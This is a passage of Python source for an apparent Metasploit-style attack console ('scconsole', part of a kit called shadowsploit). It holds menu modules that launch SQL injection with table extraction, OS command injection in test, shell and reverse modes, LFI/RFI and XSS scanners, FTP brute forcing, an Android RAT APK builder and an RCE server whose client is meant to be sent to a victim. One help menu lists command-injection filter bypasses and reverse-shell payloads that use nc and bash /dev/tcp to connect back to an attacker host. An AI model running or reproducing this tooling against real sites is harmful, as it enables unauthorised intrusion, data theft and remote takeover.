        time.sleep(0.5)
        Console()

def auxiliaryfindloginfields():
    scconsole145 = input("sc~" + color.red + "(auxiliary/find-login-fields)" + color.white + ">")
    if scconsole145 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryfindloginfields()
    elif scconsole145 == "clear":
        os.system('clear')
        auxiliaryfindloginfields()
    elif scconsole145 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target login url (e.g. : https://example.com/login.php).

you will specifiy these options when you run or exploit it!
""")
        auxiliaryfindloginfields()
    elif scconsole145 == "run":
        os.system('python exploits/auxiliary/find-login-fields.py')
        auxiliaryfindloginfields()
    elif scconsole145 == "exploit":
        os.system('python exploits/auxiliary/find-login-fields.py')
        auxiliaryfindloginfields()
    elif scconsole145 == "unuse":
        print("unusing auxiliary/find-login-fields.")
        time.sleep(0.5)
        Console()
    elif scconsole145 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def siteshellinject():
    scconsole146 = input("sc~" + color.red + "(site/shell_inject)" + color.white + ">")
    if scconsole146 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads that this exploit using.
""")
        siteshellinject()
    elif scconsole146 == "clear":
        os.system('clear')
        siteshellinject()
    elif scconsole146 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify the listener host.
LPORT           | specify the listener port.
URL              | specify the target url with parameter (example: https://example.com/find.php?find=new.txt).
METHOD           | specify the http method(GET recommended).
PARAMETER_TEST   | specify the parameter to test (example: find).

you will specifiy these options when you run or exploit it!
""")
        siteshellinject()
    elif scconsole146 == "show payloads":
        print("""
""" + color.green + """; ping -c 127.0.0.1""" + color.white + """ ---> trys to detect if there is a OS Command Injection vulnerabilitie.

""" + color.green + """; uname -a""" + color.white + """ ---> trys to detect if there is a OS Command Injection vulnerabilitie.

""" + color.green + """; nc [LHOST] [LPORT] -e /bin/bash""" + color.white + """ ---> trys to connect back to the attacker machine after finding OS Command Injection vulnerabilitie.

""" + color.green + """; echo INJECTIONTEST""" + color.white + """ ---> trys to detect if there is a OS Command Injection vulnerabilitie.

""" + color.green + """; id #""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """; id //""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """'id'""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """&& id""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """|| id""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """$(id)""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """; netstat -an""" + color.white + """ ---> Try to see the open ports from OS Command Injection vulnerabilitie.

""" + color.green + """bash -c 'bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1'""" + color.white + """ ---> trys to connect back to the attacker machine after finding OS Command Injection vulnerabilitie with bash.

the exploit is using these and other payloads.
""")
        siteshellinject()
    elif scconsole146 == "run":
        os.system('python exploits/site/shell_inject.py')
        siteshellinject()
    elif scconsole146 == "exploit":
        os.system('python exploits/site/shell_inject.py')
        siteshellinject()
    elif scconsole146 == "unuse":
        print("unusing site/shell_inject.")
        time.sleep(0.5)
        Console()
    elif scconsole146 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def androidandroidreversetcp():
    scconsole147 = input("sc~" + color.red + "(android/android_reverse_tcp)" + color.white + ">")
    if scconsole147 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        androidandroidreversetcp()
    elif scconsole147 == "clear":
        os.system('clear')
        androidandroidreversetcp()
    elif scconsole147 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify the listener host for RAT file.
LPORT            | specify the listener port for RAT file and listener.
OUTPUT           | specify the output name (with .apk).

Uses scRAT tool to generate!

you will specifiy these options when you run or exploit it!
""")
        androidandroidreversetcp()
    elif scconsole147 == "run":
        os.system('python exploits/android/android_reverse_tcp.py')
        androidandroidreversetcp()
    elif scconsole147 == "exploit":
        os.system('python exploits/android/android_reverse_tcp.py')
        androidandroidreversetcp()
    elif scconsole147 == "unuse":
        print("unusing android/android_reverse_tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole147 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliaryxssscanner():
    scconsole148 = input("sc~" + color.red + "(auxiliary/xss_scanner)" + color.white + ">")
    if scconsole148 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryxssscanner()
    elif scconsole148 == "clear":
        os.system('clear')
        auxiliaryxssscanner()
    elif scconsole148 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
WORDLIST         | specify a wordlist that uses a xss payloads (scconsole haves one : /scconsole_wordlists/xss_payloads.txt)

you will specifiy these options when you run or exploit it!
""")
        auxiliaryxssscanner()
    elif scconsole148 == "run":
        os.system('python exploits/auxiliary/xss_scanner.py')
        auxiliaryxssscanner()
    elif scconsole148 == "exploit":
        os.system('python exploits/auxiliary/xss_scanner.py')
        auxiliaryxssscanner()
    elif scconsole148 == "unuse":
        print("unusing auxiliary/xss_scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole148 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def androidGetShell():
    scconsole149 = input("sc~" + color.red + "(android/GetShell)" + color.white + ">")
    if scconsole149 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        androidGetShell()
    elif scconsole149 == "clear":
        os.system('clear')
        androidGetShell()
    elif scconsole149 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LPORT            | specify the listener port.

Uses scRAT tool!

you will specifiy these options when you run or exploit it!
""")
        androidGetShell()
    elif scconsole149 == "run":
        os.system('python exploits/android/GetShell.py')
        androidGetShell()
    elif scconsole149 == "exploit":
        os.system('python exploits/android/GetShell.py')
        androidGetShell()
    elif scconsole149 == "unuse":
        print("unusing android/GetShell.")
        time.sleep(0.5)
        Console()
    elif scconsole149 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def androidBuildShell():
    scconsole150 = input("sc~" + color.red + "(android/BuildShell)" + color.white + ">")
    if scconsole150 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        androidBuildShell()
    elif scconsole150 == "clear":
        os.system('clear')
        androidBuildShell()
    elif scconsole150 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify the listener host.
LPORT            | specify the listener port.
OUTPUT           | specify the output name (with .apk).

Uses scRAT tool to generate!

you will specifiy these options when you run or exploit it!
""")
        androidBuildShell()
    elif scconsole150 == "run":
        os.system('python exploits/android/BuildShell.py')
        androidBuildShell()
    elif scconsole150 == "exploit":
        os.system('python exploits/android/BuildShell.py')
        androidBuildShell()
    elif scconsole150 == "unuse":
        print("unusing android/BuildShell.")
        time.sleep(0.5)
        Console()
    elif scconsole150 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def auxiliarysqlinjectiondbtblc():
    scconsole151 = input("sc~" + color.red + "(auxiliary/sql-injection-db-tbl-c)" + color.white + ">")
    if scconsole151 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarysqlinjectiondbtblc()
    elif scconsole151 == "clear":
        os.system('clear')
        auxiliarysqlinjectiondbtblc()
    elif scconsole151 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url(without any parameter example: http://example.com/new.php).
PARAMETER        | it will uses id parameter (?id=).
METHOD           | specify the method GET or POST.

try to guess how many columns haves (10 times), try to take out the database name, try to take out the table names, try to take out the column named 'users'.

you will specifiy these options when you run or exploit it!
""")
        auxiliarysqlinjectiondbtblc()
    elif scconsole151 == "run":
        targetwebsite = input("Enter target URL (without parameter example: http://example.com/new.php): ")
        method24 = input("Enter method (GET/POST): ")
        os.system(f'python exploits/auxiliary/sql-injection-db-tbl-c.py {targetwebsite} {method24}')
        auxiliarysqlinjectiondbtblc()
    elif scconsole151 == "exploit":
        targetwebsite1 = input("Enter target URL (without parameter example: http://example.com/new.php): ")
        method25 = input("Enter method (GET/POST): ")
        os.system(f'python exploits/auxiliary/sql-injection-db-tbl-c.py {targetwebsite1} {method25}')
        auxiliarysqlinjectiondbtblc()
    elif scconsole151 == "unuse":
        print("unusing auxiliary/sql-injection-db-tbl-c.")
        time.sleep(0.5)
        Console()
    elif scconsole151 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def auxiliaryxsstester():
    scconsole152 = input("sc~" + color.red + "(auxiliary/xss_tester)" + color.white + ">")
    if scconsole152 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryxsstester()
    elif scconsole152 == "clear":
        os.system('clear')
        auxiliaryxsstester()
    elif scconsole152 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliaryxsstester()
    elif scconsole152 == "run":
        targetwebsite2 = input("Enter target URL: ")
        os.system(f'python exploits/auxiliary/xss_tester.py {targetwebsite2}')
        auxiliaryxsstester()
    elif scconsole152 == "exploit":
        targetwebsite3 = input("Enter target URL: ")
        os.system(f'python exploits/auxiliary/xss_tester.py {targetwebsite3}')
        auxiliaryxsstester()
    elif scconsole152 == "unuse":
        print("unusing auxiliary/xss_tester.")
        time.sleep(0.5)
        Console()
    elif scconsole152 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def siteosfinder():
    scconsole153 = input("sc~" + color.red + "(site/os_finder)" + color.white + ">")
    if scconsole153 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        siteosfinder()
    elif scconsole153 == "clear":
        os.system('clear')
        siteosfinder()
    elif scconsole153 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url to find target OS.

you will specifiy these options when you run or exploit it!
""")
        siteosfinder()
    elif scconsole153 == "run":
        targetwebsite4 = input("Enter target URL: ")
        os.system(f'python exploits/site/os_finder.py {targetwebsite4}')
        siteosfinder()
    elif scconsole153 == "exploit":
        targetwebsite5 = input("Enter target URL: ")
        os.system(f'python exploits/site/os_finder.py {targetwebsite5}')
        siteosfinder()
    elif scconsole153 == "unuse":
        print("unusing site/os_finder.")
        time.sleep(0.5)
        Console()
    elif scconsole153 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sitedirenum():
    scconsole154 = input("sc~" + color.red + "(site/dir_enum)" + color.white + ">")
    if scconsole154 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitedirenum()
    elif scconsole154 == "clear":
        os.system('clear')
        sitedirenum()
    elif scconsole154 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
WORDLIST         | specify the wordlist.

you will specifiy these options when you run or exploit it!
""")
        sitedirenum()
    elif scconsole154 == "run":
        targetweb = input("Enter target URL: ")
        dirwordlist = input("Enter the wordlist: ")
        os.system(f'python exploits/site/dir_enum.py {targetweb} {dirwordlist}')
        sitedirenum()
    elif scconsole154 == "exploit":
        targetweb2 = input("Enter target URL: ")
        dirwordlist2 = input("Enter the wordlist: ")
        os.system(f'python exploits/site/dir_enum.py {targetweb2} {dirwordlist2}')
        sitedirenum()
    elif scconsole154 == "unuse":
        print("unusing site/dir_enum.")
        time.sleep(0.5)
        Console()
    elif scconsole154 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sitesqlinjector():
    scconsole155 = input("sc~" + color.red + "(site/sql_injector)" + color.white + ">")
    if scconsole155 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitesqlinjector()
    elif scconsole155 == "clear":
        os.system('clear')
        sitesqlinjector()
    elif scconsole155 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url (if it is GET method, specify it with parameter, example: https://example.com/vuln.php?id=1).
PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
METHOD           | specify the method GET or POST.
DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).

TABLE_NAME       | after it extract the tables, specify one of the tables to extract the columns.

you will specifiy these options when you run or exploit it!
""")
        sitesqlinjector()
    elif scconsole155 == "run" or scconsole155 == "exploit":
        targetwebs = input("Enter target URL: ")
        websiteparameter = input("Enter one parameter to test: ")
        websitemethod = input("Enter the method(GET or POST): ")
        if websitemethod == "POST":
            parameterdata = input("Enter the DATA: ")
            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --data "{parameterdata}"')
            print("\n[+] Starting to extract tables\n")
            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --data "{parameterdata}" --extract-tables')
            print("\n\n")
            tablenametoextract = input("Enter the table name to extract columns(if finded): ")
            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --data "{parameterdata}" --extract-columns {tablenametoextract}')
            sitesqlinjector()
        else:
            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod}')
            print("\n[+] Starting to extract tables\n")
            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --extract-tables')
            print("\n\n")
            tablenametoextract = input("Enter the table name to extract columns(if finded): ")
            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --extract-columns {tablenametoextract}')
            sitesqlinjector()
    elif scconsole155 == "unuse":
        print("unusing site/sql_injector.")
        time.sleep(0.5)
        Console()
    elif scconsole155 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sitecmdinjector():
    scconsole156 = input("sc~" + color.red + "(site/cmd_injector)" + color.white + ">")
    if scconsole156 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitecmdinjector()
    elif scconsole156 == "clear":
        os.system('clear')
        sitecmdinjector()
    elif scconsole156 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url (example: https://example.com/vuln.php).
PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
METHOD           | specify the method GET or POST.
DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).
MODE             | specify the mode (test: just to test the OS Command Injection, shell: to get a shell from target website, reverse: to get a reverse shell but before running this you need to run a listener).

LHOST            | if mode is 'reverse' specify your ip address for listener.
LPORT            | if mode is 'reverse' specify your port for listener.
TARGET_OS        | if mode is 'reverse' specify target OS to use payloads for that OS(linux or windows).

you will specifiy these options when you run or exploit it!
""")
        sitecmdinjector()
    elif scconsole156 == "run" or scconsole156 == "exploit":
        targetwebs2 = input("Enter target URL: ")
        websiteparameter2 = input("Enter one parameter to test: ")
        testmode = input("Enter the mode(test or shell or reverse): ")
        websitemethod2 = input("Enter the method(GET or POST): ")
        if testmode == "test" and websitemethod2 == "POST":
            parameterdata2 = input("Enter the DATA: ")
            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --method {websitemethod2} --data "{parameterdata2}" --mode test')
            sitecmdinjector()
        elif testmode == "test" and websitemethod2 == "GET":
            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --method {websitemethod2} --mode test')
            sitecmdinjector()
        elif testmode =="shell":
            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --mode shell')
            sitecmdinjector()
        elif testmode =="reverse":
            youripadd = input("Enter your IP Address for listener: ")
            yourport = input("Enter your port for listener: ")
            targetos = input("Enter target os to run a reverse shell payload on it(linux or windows): ")
            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --mode reverse --lhost {youripadd} --lport {yourport} --os {targetos}')
            sitecmdinjector()
        else:
            print("[-] There is no option like That!\n")
            sitecmdinjector()
    elif scconsole156 == "unuse":
        print("unusing site/cmd_injector.")
        time.sleep(0.5)
        Console()
    elif scconsole156 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sitelfirfiscanner():
    scconsole157 = input("sc~" + color.red + "(site/lfi_rfi_scanner)" + color.white + ">")
    if scconsole157 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitelfirfiscanner()
    elif scconsole157 == "clear":
        os.system('clear')
        sitelfirfiscanner()
    elif scconsole157 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url (example: https://example.com/vuln.php?file=).
PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
METHOD           | specify the method GET or POST.
DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).

you will specifiy these options when you run or exploit it!
""")
        sitelfirfiscanner()
    elif scconsole157 == "run" or scconsole157 == "exploit":
        targeturlsite = input("Enter target URL: ")
        urlparameter = input("Enter one parameter ot test: ")
        urlmethod = input("Enter the method (GET or POST): ")
        if urlmethod == "POST":
            paramdata = input("Enter the DATA: ")
            os.system(f'python exploits/site/lfi_rfi_scanner.py {targeturlsite} {urlparameter} --method POST --data "{paramdata}"')
            sitelfirfiscanner()
        elif urlmethod == "GET":
            os.system(f'python exploits/site/lfi_rfi_scanner.py {targeturlsite} {urlparameter} --method GET')
            sitelfirfiscanner()
        else:
            print("[-] There is no option like that!\n")
            sitelfirfiscanner()
    elif scconsole157 == "unuse":
        print("unusing site/lfi_rfi_scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole157 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def sitexssscan():
    scconsole158 = input("sc~" + color.red + "(site/xss_scan)" + color.white + ">")
    if scconsole158 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitexssscan()
    elif scconsole158 == "clear":
        os.system('clear')
        sitexssscan()
    elif scconsole158 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url (example: https://example.com/vuln.php).
PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
METHOD           | specify the method GET or POST.
DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).

you will specifiy these options when you run or exploit it!
""")
        sitexssscan()
    elif scconsole158 == "run" or scconsole158 == "exploit":
        targeturlsite2 = input("Enter target URL: ")
        urlparameter2 = input("Enter one parameter ot test: ")
        urlmethod2 = input("Enter the method (GET or POST): ")
        if urlmethod2 == "POST":
            paramdata2 = input("Enter the DATA: ")
            os.system(f'python exploits/site/xss_scan.py {targeturlsite2} {urlparameter2} --method POST --data "{paramdata2}"')
            sitexssscan()
        elif urlmethod2 == "GET":
            os.system(f'python exploits/site/xss_scan.py {targeturlsite2} {urlparameter2} --method GET')
            sitexssscan()
        else:
            print("[-] There is no option like that!\n")
            sitexssscan()
    elif scconsole158 == "unuse":
        print("unusing site/xss_scan.")
        time.sleep(0.5)
        Console()
    elif scconsole158 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def siteuploadfinder():
    scconsole159 = input("sc~" + color.red + "(site/upload_finder)" + color.white + ">")
    if scconsole159 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        siteuploadfinder()
    elif scconsole159 == "clear":
        os.system('clear')
        siteuploadfinder()
    elif scconsole159 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url (example: https://example.com).
DEPTH            | specify crawl depth(default: 2).

you will specifiy these options when you run or exploit it!
""")
        siteuploadfinder()
    elif scconsole159 == "run" or scconsole159 == "exploit":
        targeturlsite3 = input("Enter target URL: ")
        crawldepth = int(input("Enter the crawl depth(default: 2): "))
        os.system(f'python exploits/site/upload_finder.py {targeturlsite3} --depth {crawldepth}')
        siteuploadfinder()
    elif scconsole159 == "unuse":
        print("unusing site/upload_finder.")
        time.sleep(0.5)
        Console()
    elif scconsole159 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def auxiliaryftpbruteforce():
    scconsole160 = input("sc~" + color.red + "(auxiliary/ftp_brute_force)" + color.white + ">")
    if scconsole160 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryftpbruteforce()
    elif scconsole160 == "clear":
        os.system('clear')
        auxiliaryftpbruteforce()
    elif scconsole160 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
RPORT            | specify target ftp port (default 21).
USERNAME         | specify target username.
USERNAMELIST     | or specify the usernamelist.
PASSWORDLIST     | specify the passwordlist.

you will specifiy these options when you run or exploit it!
""")
        auxiliaryftpbruteforce()
    elif scconsole160 == "run" or scconsole160 == "exploit":
        os.system('python exploits/auxiliary/ftp_brute_force.py')
        auxiliaryftpbruteforce()
    elif scconsole160 == "unuse":
        print("unusing auxiliary/ftp_brute_force.")
        time.sleep(0.5)
        Console()
    elif scconsole160 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def multirceserver():
    scconsole161 = input("sc~" + color.red + "(multi/rce_server)" + color.white + ">")
    if scconsole161 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multirceserver()
    elif scconsole161 == "clear":
        os.system('clear')
        multirceserver()
    elif scconsole161 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specified as '0.0.0.0'.
LPORT            | specified as '9999'.

you will specifiy these options when you run or exploit it!
""")
        multirceserver()
    elif scconsole161 == "run" or scconsole161 == "exploit":
        print("[!] Send 'rce_client.py' from 'shadowsploit/payloads/rce_client.py' to your target.")
        os.system('python exploits/multi/rce_server.py')
        multirceserver()
    elif scconsole161 == "unuse":
        print("unusing multi/rce_server.")
        time.sleep(0.5)
        Console()
    elif scconsole161 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def windowsExelPasswordRecovery():
    scconsole162 = input("sc~" + color.red + "(windows/Exel_Password_Recovery)" + color.white + ">")
    if scconsole162 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        windowsExelPasswordRecovery()
    elif scconsole162 == "clear":
        os.system('clear')
        windowsExelPasswordRecovery()
    elif scconsole162 == "show options":
        print("""
THERE IS NO OPTIONS OR ANY DISCREPTIONS!

Steps to Produce the Crash: 
 1. Run or Exploit
 2. Open EVIL.txt and copy content to clipboard
 3. Open Excel Password Recovery Professional
 4. Paste the content of EVIL.txt into the field: 'E-Mail and Registrations Code'
 5. Click 'Register' and you will see a crash.
""")
        windowsExelPasswordRecovery()
    elif scconsole162 == "run" or scconsole162 == "exploit":
        os.system('python exploits/windows/Exel_Password_Recovery.py')
        windowsExelPasswordRecovery()
    elif scconsole162 == "unuse":
        print("unusing windows/Exel_Password_Recovery.")
        time.sleep(0.5)
        Console()
    elif scconsole162 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerWAFChecker():
    scconsole163 = input("sc~" + color.red + "(scanner/WAF_Checker)" + color.white + ">")
    if scconsole163 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerWAFChecker()
    elif scconsole163 == "clear":
        os.system('clear')
        scannerWAFChecker()
    elif scconsole163 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify target url.

you will specifiy these options when you run or exploit it!
""")
        scannerWAFChecker()
    elif scconsole163 == "run" or scconsole163 == "exploit":
        os.system('python exploits/scanner/WAF_Checker.py')
        scannerWAFChecker()
    elif scconsole163 == "unuse":
        print("unusing scanner/WAF_Checker.")
        time.sleep(0.5)
        Console()
    elif scconsole163 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def multilistener():
    scconsole164 = input("sc~" + color.red + "(multi/listener)" + color.white + ">")
    if scconsole164 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multilistener()
    elif scconsole164 == "clear":
        os.system('clear')
        multilistener()
    elif scconsole164 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LPORT            | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        multilistener()
    elif scconsole164 == "run" or scconsole164 == "exploit":
        listeningport = input("LPORT: ")
        os.system(f'python exploits/multi/listener.py -p {listeningport}')
        multilistener()
    elif scconsole164 == "unuse":
        print("unusing multi/listener.")
        time.sleep(0.5)
        Console()
    elif scconsole164 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def bufferoverflowfuzzerbasic():
    scconsole165 = input("sc~" + color.red + "(buffer_overflow/fuzzer_basic)" + color.white + ">")
    if scconsole165 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        bufferoverflowfuzzerbasic()
    elif scconsole165 == "clear":
        os.system('clear')
        bufferoverflowfuzzerbasic()
    elif scconsole165 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
RPORT            | specify target vulnerable port(or open port).

you will specifiy these options when you run or exploit it!
""")
        bufferoverflowfuzzerbasic()
    elif scconsole165 == "run" or scconsole165 == "exploit":
        os.system('python exploits/buffer_overflow/fuzzer_basic.py')
        bufferoverflowfuzzerbasic()
    elif scconsole165 == "unuse":
        print("unusing buffer_overflow/fuzzer_basic.")
